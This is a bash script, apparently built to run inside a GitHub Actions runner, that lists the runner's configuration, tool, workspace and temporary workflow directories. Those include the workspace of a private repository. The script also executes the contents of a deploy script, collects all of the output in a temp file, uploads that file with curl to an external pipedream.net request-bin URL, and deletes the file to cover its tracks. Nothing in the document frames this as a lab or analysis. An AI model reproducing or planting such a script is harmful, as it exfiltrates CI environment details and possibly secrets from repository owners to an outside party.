#!/bin/bash

echo "--- START ---" > /tmp/file.txt

echo "--- /home/runner" >> /tmp/file.txt
ls -1la /home/runner >> /tmp/file.txt

echo "--- /home/runner/.config" >> /tmp/file.txt
ls -1la /home/runner/.config >> /tmp/file.txt
echo "--- /home/runner/.config/GitHub\ActionsService" >> /tmp/file.txt
ls -1la /home/runner/.config/GitHub\ActionsService >> /tmp/file.txt
echo "--- /home/runner/.config/configstore" >> /tmp/file.txt
ls -1la /home/runner/.config/configstore >> /tmp/file.txt

echo "--- /home/runner/runners" >> /tmp/file.txt
ls -1la /home/runner/runners >> /tmp/file.txt
echo "--- /home/runner/runners/2.283.3" >> /tmp/file.txt
ls -1la /home/runner/runners/2.283.3 >> /tmp/file.txt
echo "--- /home/runner/runners/2.283.3/externals" >> /tmp/file.txt
ls -1la /home/runner/runners/2.283.3/externals >> /tmp/file.txt

echo "--- /home/runner/warmup " >> /tmp/file.txt
ls -1la /home/runner/warmup >> /tmp/file.txt

echo "--- home/runner/work" >> /tmp/file.txt
ls -1la /home/runner/work >> /tmp/file.txt

echo "--- home/runner/work/comment-ops-private-matiasesena" >> /tmp/file.txt
ls -1la /home/runner/work/comment-ops-private-matiasesena >> /tmp/file.txt
echo "--- home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena" >> /tmp/file.txt
ls -1la /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena >> /tmp/file.txt
echo "--- home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/tools" >> /tmp/file.txt
ls -1la /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/tools >> /tmp/file.txt

echo "--- home/runner/work/_temp" >> /tmp/file.txt
ls -1la /home/runner/work/_temp >> /tmp/file.txt

echo "--- home/runner/work/_temp/_github_workflow" >> /tmp/file.txt
ls -1la /home/runner/work/_temp/_github_workflow >> /tmp/file.txt
echo "--- home/runner/work/_temp/_runner_file_commands" >> /tmp/file.txt
ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt

ls -1la . >> /tmp/file.txt
ls -1la ./tools >> /tmp/file.txt

echo "--- deploy" >> /tmp/file.txt
$(cat deploy-script.sh) >> /tmp/file.txt


echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
